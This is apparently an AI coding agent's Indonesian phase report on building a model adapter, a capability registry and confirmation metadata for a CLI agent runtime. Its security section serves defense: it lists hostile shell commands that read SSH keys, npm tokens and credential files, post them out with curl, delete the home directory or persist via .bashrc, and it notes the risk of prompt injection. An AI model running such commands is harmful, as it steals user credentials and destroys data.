# MethaTech Universal Agent Runtime — FASE 2: Provider Adapter Standardization

**Tanggal:** 2026-11-10
**Status:** SELESAI, teruji, TIDAK commit/publish/deploy. HEAD tetap `b384284` (0.1.8).
**Repo:** `~/workspace/metatech-cli/` (working tree 0.1.9 §4j–§4q + Fase 1 audit + Fase 3 registry + Fase 2 ini).
**Referensi:** `docs/UNIVERSAL-RUNTIME-AUDIT.md` (Fase 1), `docs/UNIVERSAL-RUNTIME-PHASE3.md` (Fase 3),
spek Universal Runtime §3 + Keputusan Reza 2026-11-10 + Klarifikasi Reza 2026-11-10.
**Backup pre-Fase 2:** `.bak-20261110-adapter/` (`loop.ts`, `api.ts`, `tool-registry.ts`, `ChatApp.tsx`,
`index.ts`, `tool-registry.test.mjs`, `UNIVERSAL-RUNTIME-AUDIT.md`).

**KOREKSI 2026-11-10 (Fase 5):** rujukan "Fase 5" di dokumen ini
yang menyangkut native tool calling (pengirim `tools`, parser
`delta.tool_calls`, routing per capability) adalah usulan urutan
audit yang SUDAH DIBATALKAN oleh koreksi roadmap Reza — native
tool calling BUKAN Fase 5 (Fase 5 = Universal Agent Loop,
docs/UNIVERSAL-RUNTIME-PHASE5.md), melainkan pekerjaan fase
berikutnya. Riwayat fase ini tidak ditulis ulang; hanya penamaan
fase yang dikoreksi.

## 0. Keputusan yang mengikat fase ini

### 0.1 Keputusan Reza 2026-11-10 (dari Fase 1/3, tetap berlaku)

1. Confirmation gate HANYA untuk tool kritis + flag `--yolo` (gate di Fase 8).
2. Capability registry di CLI dulu, status SUPPORTED / UNSUPPORTED / UNKNOWN.
3. Runtime TETAP lokal di CLI; panel tetap relay.
4. Live probe SUBSET (10 free + Sonnet + Opus + 1 per provider lain) — Fase 9.
5. Paralel hanya read-only tanpa dependency; mutasi sekuensial.

### 0.2 Klarifikasi Reza 2026-11-10 (baru, diterima bersama perintah Fase 2)

**A. Permission dan risk DIBEDAKAN.** Read-only = tool tidak mengubah state atau file.
Mutating = tool melakukan perubahan. Risk = tingkat dampak + kebutuhan konfirmasi.
Tidak semua mutating otomatis berbahaya, tidak semua mutating aman. Konfirmasi
berdasarkan risiko:

| Tool | Risk | Kebijakan konfirmasi (metadata Fase 2) |
|---|---|---|
| `run_terminal_command` | critical | **required** — WAJIB gate |
| `write_file` | high | **required** — WAJIB konfirmasi saat gate diimplementasikan |
| `str_replace` | high | **scoped** — gate mengevaluasi cakupan perubahan + risk metadata |
| `write_todos` | low | none — ikut risk + permission masing-masing |
| `skill` | medium | none — ikut risk + permission masing-masing |
| semua read-only lain | low | none |

`--yolo` boleh melewati konfirmasi interaktif, tapi TIDAK BOLEH melewati sandbox,
security policy, validasi input, atau perlindungan kredensial. **Gate TIDAK
diimplementasikan di fase ini** — registry hanya menyediakan metadata yang cukup
(§2).

**B. Fase 2 harus menjaga kompatibilitas.** Jangan merusak jalur XML tool calling.
Jangan mengasumsikan semua provider mendukung native function calling. Jangan
mengarang kemampuan model yang belum diuji. Pertahankan streaming, Thinking,
Ctrl+C, dan agent loop. Adapter konsisten tanpa memaksakan semua provider punya
fitur identik.

**C. Keamanan tetap prioritas.** Audit ulang risiko akses file kredensial melalui
`run_terminal_command`. Standardisasi adapter TIDAK BOLEH memperlebar akses shell
atau melemahkan sandbox (§5).

## 1. Yang dibangun

### 1.1 Modul baru: `src/agent/model-adapter.ts` — kontrak internal seragam

Satu interface `ModelAdapter` antara loop dan transport, menggantikan pemanggilan
`streamChat` langsung:

```ts
interface ModelAdapter {
  id: string; // "panel-openai-compatible"
  chat(request: AdapterChatRequest): AsyncIterable<ChatChunk>;
}
```

- **`AdapterChatRequest`** — `{apiKey, model, messages, maxTokens?, signal?,
  tools?, toolChoice?}`. Field `tools`/`toolChoice` ada di kontrak supaya Fase 5
  hanya mengisi pengirimnya, bukan bentuknya — tapi adapter Fase 2 **MENOLAK**
  request yang menyertakan `tools` dengan `AdapterError` fail-loud ("native tools
  are not wired yet (Fase 5)"). Tidak ada yang diam-diam berpura-pura native
  calling jalan.
- **`ChatChunk`** — format internal seragam: `{type:"text"}`, `{type:"reasoning"}`,
  `{type:"usage"}`, `{type:"finish", reason}`, `{type:"tool_call", id, index,
  name, arguments, complete}`. Chunk `tool_call` TIDAK PERNAH di-emit di Fase 2
  (transport tidak mengirim `tools`, server tidak mengembalikan
  `delta.tool_calls`); bentuknya sudah ditetapkan supaya Fase 5 hanya menambah
  parser.
- **`AdapterFinishReason`** — `stop | length | tool_calls | content_filter |
  unknown`, dipetakan dari string `finish_reason` OpenAI (pola Freebuff
  `map-openai-compatible-finish-reason.ts`, tanpa dependensi Vercel AI SDK).
  Finish chunk hanya di-emit bila server benar-benar mengirim finish reason —
  tidak ada finish reason yang dikarang.
- **`AdapterError` + `normalizeProviderError()`** — normalisasi error per
  STATUS HTTP (panel sudah menormalisasi error upstream tiap provider ke badan
  error OpenAI-compatible, jadi mapping per nama provider tidak mungkin dan
  tidak dilakukan di CLI): 401 → `auth` (tidak retryable), 402 → `quota`
  (tidak retryable), 429 → `rate_limit` (retryable), 408/500/502/503/504 →
  `server` (retryable), gagal fetch → `network` (retryable), abort →
  `aborted`. Pesan ramah dari `api.ts` dipertahankan verbatim (teks TUI tidak
  berubah); `kind` + `retryable` adalah bagian yang akan dibaca retry policy
  Fase 7. Status retryable mengikuti pola Freebuff `codebuff-web-api.ts`
  (408/429/500/502/503/504).
- **`PanelChatAdapter`** — satu-satunya implementasi hari ini; membungkus
  `streamChat` yang sudah ada (transport SAMA, timeout 120s SAMA, parsing SSE
  SAMA). Transport di-inject lewat konstruktor (konvensi Freebuff AGENTS.md:
  "prefer dependency injection over module mocking") sehingga test memakai
  fake tanpa mock modul jaringan. Bila konsumen berhenti iterasi lebih awal
  (break), adapter meng-abort request yang sedang berjalan — tidak ada stream
  yang tertinggal.
- **`collectChatText(adapter, request, cbs)`** — helper yang dipakai loop dan
  `/compact`: mengumpulkan teks/reasoning, meneruskan delta ke callback
  (streaming TUI tetap jalan), mengembalikan `{text, reasoning, usage,
  finishReason}`.

### 1.2 Modul baru: `src/agent/model-capabilities.ts` — capability registry di CLI

Sumber kebenaran untuk apa yang tiap model TERBUKTI bisa lakukan:

- **Status per capability:** `SUPPORTED | UNSUPPORTED | UNKNOWN`. UNKNOWN
  adalah default yang jujur. SUPPORTED/UNSUPPORTED hanya dari live probe
  (Fase 9) atau konfigurasi provider — TIDAK PERNAH dari nama model.
- **Seed:** semua record dari katalog (`COMPILED_PRICES` ∪ `FREE_MODEL_IDS`).
  Semua capability UNKNOWN **kecuali `streaming: SUPPORTED`** — dan itu
  eksplisit dicatat sebagai fakta TRANSPORT (satu endpoint SSE
  OpenAI-compatible untuk semua model, sudah terverifikasi audit), bukan hasil
  probe per model. `contextWindow: null` (= unknown, bukan unlimited).
- **Provenance per field** (`fieldSources`): tiap nilai mencatat asalnya
  (`probe-live` / `provider-config` / `transport` / `default`), supaya pembaca
  bisa membedakan fakta transport dari hasil probe dari default.
- **`provider` adalah LABEL TAMPILAN saja** (dari prefix id model, mis.
  `claude-*` → Anthropic). Bukan info routing (panel yang me-routing per
  channel) dan bukan inferensi capability. Label otoritatif dari katalog live
  (`owned_by`) bisa menimpanya lewat `mergeCatalogOwnedBy()` — tanpa mengubah
  panel.
- **API:** `listCapabilityRecords()`, `getCapabilityRecord()`,
  `capabilitiesFor()` (model tak dikenal → default all-UNKNOWN, loop tidak
  pernah crash), `setCapability()` (tulis hasil probe; kunci tak dikenal
  throw; `verifiedAt` di-stamp hanya untuk `probe-live`),
  `modelsByProvider()`, `providersInRegistry()`, `mergeCatalogOwnedBy()`,
  `isCapabilityProven()` (true hanya bila SUPPORTED **dan** sumbernya
  `probe-live` atau `transport` — nilai SUPPORTED dari `provider-config`
  TIDAK dihitung terbukti untuk routing; ini yang dibaca Fase 5).
- **`toAvailableModelEntry()`** — serialisasi ke bentuk snake_case yang bisa
  dikembalikan `/api/available_model` di masa depan (`id`, `owned_by`,
  `capabilities: {...}`, `capability_source`, `verified_at`). **Desain saja**:
  panel TIDAK diubah, tidak ada yang membaca bentuk ini di Fase 2. Tujuannya
  supaya registry CLI dan field server nanti sudah sepakat soal key, status,
  dan provenance — integrasi nanti jadi merge, bukan redesign.
- **Registry TIDAK dipersist ke disk di fase ini** — hasil probe dicatat di
  laporan Fase 9 dan di-seed ulang dari dokumen audit sampai persistensi
  diputuskan (Fase 9/10).

### 1.3 Metadata konfirmasi di registry (Klarifikasi A)

`src/agent/tool-registry.ts` diperluas (tanpa mengubah perilaku runtime):

- Field baru **`confirmationPolicy: "required" | "scoped" | "none"`** +
  **`confirmationNote?`** (faktor evaluasi untuk "scoped") pada tiap
  `RegisteredTool`. Nilai eksplisit per tool di tabel metadata, dengan aturan
  konsistensi yang dites: policy "required" ⇒ risk high/critical; "scoped" ⇒
  risk high; "none" ⇒ risk low/medium.
- **`requiresConfirmation`** didefinisikan ulang sebagai
  `confirmationPolicy !== "none"` (dulu: `risk === "critical"` saja). Akibatnya
  `toolsRequiringConfirmation()` kini mengembalikan `["str_replace",
  "write_file", "run_terminal_command"]` (urutan factory). Helper baru
  `confirmationPolicyFor(name)`.
- `str_replace` = "scoped" dengan note: gate Fase 8 mengevaluasi jumlah
  replacement, total karakter berubah, dan sensitivitas file target (aturan
  pastinya didefinisikan Fase 8; registry hanya mencatat faktornya).
- **Test Fase 3 yang lama diperbarui** (test "gate only for critical" diganti
  test kebijakan baru + test klasifikasi read-only/mutating dipisah). Dokumen
  Fase 3 mendapat catatan klarifikasi di §7; riwayat Fase 3 sebagai fase
  tidak ditulis ulang.

### 1.4 Wiring minimal

| File | Perubahan |
|---|---|
| `src/api.ts` | Tambah handler opsional `onFinishReason` di `StreamHandlers` + tangkap `choices[0].finish_reason` di `handleLine`. Aditif saja; tidak ada caller lama yang terpengaruh. |
| `src/agent/loop.ts` | Default `callModel` kini lewat `createDefaultAdapter()` + `collectChatText()` (maxTokens 4096, signal diteruskan). Teks/reasoning yang dikembalikan SAMA; jalur XML di bawahnya TIDAK disentuh. |
| `src/ui/ChatApp.tsx` | `/compact` kini lewat adapter yang sama (satu jalur model-call). `streamChat` tidak lagi diimpor di file ini. |
| `src/agent/index.ts` | Export `model-adapter.ts` + `model-capabilities.ts` (+ `tool-registry.ts` yang ketinggalan di Fase 3). |

**Satu-satunya file source yang diubah selain wiring:** `tool-registry.ts`
(metadata konfirmasi). **`tools.ts` TIDAK disentuh** — tidak ada handler yang
berubah, tidak ada tool yang dibuat ulang.

## 2. Kompatibilitas provider — apa yang konsisten, apa yang tetap berbeda

**Konsisten sekarang (di level CLI):**

- Satu endpoint, satu bentuk request, satu stream chunk, satu taksonomi
  error — untuk SEMUA model. Ganti model tidak mengubah satu baris pun kode
  request (sama seperti sebelum Fase 2; sekarang dikontrakkan secara formal,
  bukan implisit).
- Finish reason dinormalisasi (pola Freebuff) — Fase 5 bisa me-routing
  `stop` vs `tool_calls` tanpa membaca string mentah provider.
- Error yang bisa di-retry ditandai secara eksplisit (`retryable`), tapi
  TIDAK di-retry di fase ini (kebijakan retry = Fase 7).

**Tetap berbeda per provider (jujur dicatat, bukan disembunyikan):**

- **Native tool calling: UNKNOWN untuk semua model.** Tidak ada model yang
  pernah diuji mengirim `tools` lewat jalur ini. Adapter TIDAK mengasumsikan
  apa pun — request dengan `tools` ditolak fail-loud sampai Fase 5.
- **Teks pesan error** masih berasal dari upstream (panel meneruskan pesan
  error provider). Normalisasi hanya di level kind/status, bukan isi pesan.
- **Reasoning deltas** (`delta.reasoning_content`) hanya muncul bila
  provider/panel mengirimkannya; adapter meneruskannya apa adanya, tidak
  menjamin keberadaannya per model.
- **Perilaku XML** tetap berbeda per model (hanya `glm-5.3-flash` yang
  terbukti live mengikuti protokol XML; model lain belum dibuktikan) —
  capability registry mencatatnya sebagai UNKNOWN sampai probe Fase 9.
- **Transformer panel per provider** (Claude/Gemini native vs
  OpenAI-compatible) tetap hidup di panel dan tidak disentuh fase ini.
  Adapter CLI tidak mencoba meniru atau menggantikannya.

## 3. Tes

| Tes | Hasil |
|---|---|
| `npx tsc` | bersih |
| `npm test` (unit) | **259/259** (237 sebelumnya + 22 baru) |
| `bash test/agent-pty.sh` | **32/32** |
| `bash test/tui-pty.sh` | **270/270** |

Test baru:

- `test/model-adapter.test.mjs` (9 test): pemetaan finish reason (termasuk
  `function_call` → `tool_calls`, nilai tak dikenal → `unknown`); normalisasi
  error per status HTTP (401/402/429/408/500/502/503/504/400), abort,
  network, unknown, dan pass-through `AdapterError`; chunk ter-normalisasi
  dalam urutan (text → reasoning → usage → finish); finish chunk hanya bila
  server mengirim finish reason; `collectChatText` (akumulasi + forward
  delta); penolakan fail-loud bila `tools` disertakan; error transport jadi
  `AdapterError` ternormalisasi; signal yang sudah di-abort → kind
  `aborted`; break dari iterasi meng-abort transport (tidak hang).
- `test/model-capabilities.test.mjs` (11 test): seed mencakup semua model
  katalog; seed jujur (UNKNOWN kecuali streaming SUPPORTED dari transport);
  tidak ada capability yang disimpulkan dari nama model
  (`claude-sonnet-4-6` tetap UNKNOWN untuk native tools); model tak dikenal
  → default all-UNKNOWN (termasuk streaming); label provider per prefix;
  `setCapability` mencatat probe + stamp `verifiedAt` + menolak field tak
  dikenal; `mergeCatalogOwnedBy` menimpa label + mengabaikan id tak dikenal;
  serialisasi `toAvailableModelEntry` (snake_case, tanpa nilai karangan);
  `isCapabilityProven` hanya percaya `probe-live` dan `transport`.
- `test/tool-registry.test.mjs` (diperbarui, +1 test): test kebijakan
  konfirmasi baru + test klasifikasi read-only/mutating dipisah; konsistensi
  policy↔risk dites untuk ke-11 tool.

Catatan pengujian jujur:

- Satu kegagalan awal adalah kesalahan SAYA di test (bukan regresi):
  serialisasi `capability_source` memakai key camelCase internal, test
  mengharapkan snake_case seperti field `capabilities`. Diperbaiki di
  implementasi (serializer kini memetakan provenance ke snake_case yang
  sama), bukan di test. Run hijau final setelah perbaikan.
- Satu kegagalan awal di tengah jalan adalah kesalahan SAYA di
  `model-adapter.ts` (bukan regresi): pola check-then-call pada variabel
  `waiting` membingungkan narrowing TypeScript (tipe `never`), dan field
  chunk reasoning salah nama (`chunk.reasoning` padahal bentuknya
  `{type:"reasoning", text}`). Keduanya diperbaiki sebelum run hijau
  (helper `wake()` + `chunk.text`); tidak ada test yang diubah untuk
  meloloskan kode.

## 4. Audit ulang keamanan — akses file kredensial via `run_terminal_command`

Temuan Fase 1 dikonfirmasi ulang dari source (`src/agent/tools.ts`,
`runTerminalCommandTool`, dan `src/agent/prompt.ts`):

### 4.1 Fakta (dari kode, bukan asumsi)

- Handler shell: `spawn("bash", ["-c", command], {cwd})`. Yang di-sandbox
  HANYA `cwd` awal (via `resolveInside`); **isi perintah TIDAK divalidasi
  sama sekali**.
- Yang bisa dilakukan model lewat satu tool call (semuanya jalan sebagai
  OS user yang sama dengan CLI):
  - **Baca kredensial:** `cat ~/.config/metatech/credentials.json` (API key
    panel; file mode 0600 tapi user yang sama bisa baca),
    `cat ~/.ssh/id_ed25519`, `cat ~/.npmrc` (token npm),
    `cat ~/.config/gh/hosts.yml`, `.env` di mana pun di home, `env`
    (semua environment variable).
  - **Eksfiltrasi:** shell punya egress jaringan yang sama dengan CLI —
    `curl -X POST https://... --data-binary @~/.config/metatech/credentials.json`
    jalan. Selain itu, hasil tool OTOMATIS masuk ke history model dan
    dikirim kembali ke panel pada request berikutnya — kredensial yang
    dibaca mendarat di konteks provider.
  - **Destruksi/persistensi:** `rm -rf ~`, `rm -rf ~/workspace` jalan
    sebagai user; `>> ~/.bashrc` bertahan antar sesi.
  - **Bypass sandbox file tools:** `read_files`/`write_file` terkunci
    `resolveInside` (tidak bisa keluar dari cwd) — tapi shell melewati
    pembatasan itu sepenuhnya. Sandbox file BUKAN security boundary
    selama tool shell ada.
- **Koreksi terhadap catatan audit Fase 1 §8:** catatan itu menyebut
  "aturan prompt sudah ada" — setelah dibaca ulang, aturan prompt itu
  MEMANG ada (`prompt.ts:142-143,145`): "Stay inside the project folder…
  Do not read, list, or search files outside it unless the user gave you
  that exact path", "Do not run destructive or hard-to-update commands…
  unless the user asks for them", dan "Never paste file contents, terminal
  output… back into your reply". Koreksi yang penting: itu adalah
  **instruksi ke model, bukan enforcement**. Model yang patuh tidak akan
  membaca `~/.config`; model yang tidak patuh (atau di-jailbreak lewat
  prompt injection dari isi file, atau user yang memberi path di luar
  proyek — yang memang diizinkan aturan prompt itu) tidak menghadapi
  penghalang teknis apa pun. Aturan "jangan paste output ke balasan"
  membatasi paparan di layar, TAPI hasil tool tetap masuk history model
  yang dikirim ke panel.

### 4.2 Mitigasi yang SUDAH ada (tidak berubah di fase ini)

- `cwd` awal terkunci di dalam project folder; timeout 120/600/-1 detik;
  output cap 50.000 karakter; mode PLAN mencabut shell + file-write;
  validasi schema registry (hanya bentuk input, bukan isi perintah);
  prompt rules di atas.

### 4.3 Mitigasi yang BELUM ada (direncanakan, BUKAN di fase ini)

- Validasi isi perintah shell (denylist pola destruktif + allowlist
  direktori) — Fase 8.
- Secret redaction dari output tool/error/log — Fase 8.
- Audit log eksekusi tool — Fase 8.
- Confirmation gate (`required`/`scoped`, metadata sudah siap di §1.3) +
  flag `--yolo` — Fase 8. `--yolo` TIDAK PERNAH melewati sandbox, policy,
  validasi, atau perlindungan kredensial.
- Prompt rule sebagai defense-in-depth tambahan (mis. larangan eksplisit
  membaca file kredensial) — Fase 8, dan tetap bukan pengganti enforcement.

### 4.4 Dampak Fase 2 terhadap risiko ini: TIDAK ADA

- Adapter tidak menyentuh eksekusi tool sama sekali: `tools.ts` TIDAK
  diubah, tidak ada jalur shell baru, tidak ada pelonggaran sandbox.
  Satu-satunya perubahan adalah jalur pemanggilan model (loop +
  `/compact` lewat kontrak adapter).
- Bukti: `git diff` Fase 2 tidak menyentuh `tools.ts`; semua test shell
  yang sudah ada tetap hijau (agent-pty 32/32, tui-pty 270/270).
- Risiko di atas dilaporkan apa adanya karena Reza memintanya — bukan
  karena Fase 2 memperburuknya, dan bukan untuk ditunda diam-diam: ini
  adalah item Fase 8 yang paling berisiko dan harus dikerjakan sebelum
  runtime dipakai luas di luar pengawasan.

## 5. Yang TIDAK diubah / TIDAK dilakukan di fase ini

- **Jalur XML tool calling TIDAK berubah**: tag `<codebuff_tool_call>` +
  alias `<codex_tool_call>`, parser, nudge, error retry — semuanya sama
  persis. Bukti: agent-pty 32/32 dan tui-pty 270/270 tetap hijau.
- **Fallback lama TIDAK dihapus.** Tidak ada jalur yang dimatikan.
- **Native `tools` TIDAK dikirim** — adapter menolaknya fail-loud. Itu
  pekerjaan Fase 5.
- **Confirmation gate + flag `--yolo` TIDAK diimplementasikan** — hanya
  metadata `confirmationPolicy` (§1.3). Gate adalah pekerjaan Fase 8.
- **Tidak ada perubahan panel / production / database.** Tidak ada
  perubahan perilaku eksekusi tool, timeout shell, cap output, atau
  sandbox `resolveInside`.
- **Capability registry TIDAK dipersist** dan TIDAK diisi probe live —
  probe adalah Fase 9 (subset Keputusan 4).
- **Tidak ada retry policy** (Fase 7), tidak ada auto-compaction (Fase 7),
  tidak ada orchestrator terpisah (Fase 4).

## 6. File yang dibuat / diubah

| File | Perubahan |
|---|---|
| `src/agent/model-adapter.ts` | BARU (~430 baris): kontrak `ModelAdapter`, `ChatChunk`, `AdapterError` + normalisasi, `PanelChatAdapter`, `collectChatText` |
| `src/agent/model-capabilities.ts` | BARU (~330 baris): capability registry, seed jujur, `setCapability`, `mergeCatalogOwnedBy`, `isCapabilityProven`, `toAvailableModelEntry` |
| `test/model-adapter.test.mjs` | BARU (9 test) |
| `test/model-capabilities.test.mjs` | BARU (11 test) |
| `src/api.ts` | Tambah `onFinishReason` (aditif) |
| `src/agent/loop.ts` | Default `callModel` lewat adapter |
| `src/ui/ChatApp.tsx` | `/compact` lewat adapter; hapus impor `streamChat` |
| `src/agent/index.ts` | Export modul baru (+ `tool-registry.ts`) |
| `src/agent/tool-registry.ts` | `confirmationPolicy` + `confirmationNote`, derivasi `requiresConfirmation` baru, tipe `OpenAiFunctionTool`, helper `confirmationPolicyFor` |
| `test/tool-registry.test.mjs` | Test kebijakan konfirmasi baru + test klasifikasi dipisah |
| `docs/UNIVERSAL-RUNTIME-PHASE2.md` | BARU (dokumen ini) |
| `docs/UNIVERSAL-RUNTIME-AUDIT.md` | Tandai Fase 2 SELESAI + Klarifikasi 2026-11-10 di §11 |
| `docs/UNIVERSAL-RUNTIME-PHASE3.md` | Catatan klarifikasi kebijakan konfirmasi di §7 |

## 7. Hook untuk fase berikutnya

- **Fase 5 (native path):** kirim `tools` (dari `toOpenAiFunction`) lewat
  `AdapterChatRequest.tools`; parse `delta.tool_calls` menjadi chunk
  `tool_call`; routing per step membaca `isCapabilityProven(record,
  "nativeToolCalling")` — model yang belum terbukti tetap jalur XML, dan
  model yang dikirimi `tools` tapi menjawab XML tetap di-parse sebagai
  fallback (pola Freebuff dual-path).
- **Fase 4 (orchestrator):** baca `effect` + `permission` +
  `confirmationPolicy` dari registry sebelum eksekusi; paralel hanya
  read-only tanpa dependency.
- **Fase 8 (security):** implementasikan gate dari `confirmationPolicy`
  (`required`/`scoped`/`none`) + `--yolo`; validasi shell; redaction;
  audit log. Lihat §4.4 — ini item paling berisiko yang tertunda.
- **Fase 9 (probe live):** subset Keputusan 4; hasil probe ditulis lewat
  `setCapability(..., "probe-live")`; `verifiedAt` + `fieldSources`
  mencatat bukti per field.

## 8. Status akhir

Fase 2 SELESAI. Kontrak adapter seragam sudah jadi (satu request, satu
stream chunk, satu taksonomi error), capability registry CLI sudah jadi
dengan seed yang jujur (UNKNOWN kecuali streaming dari transport), dan
metadata konfirmasi sudah diperbaiki sesuai klarifikasi Reza — semuanya
teruji penuh tanpa mengubah perilaku XML, streaming, Thinking, Ctrl+C,
atau agent loop yang sudah berjalan. Belum commit/publish — tunggu gaz
Reza. JANGAN lanjut ke Fase 5 sebelum Reza memberi perintah.
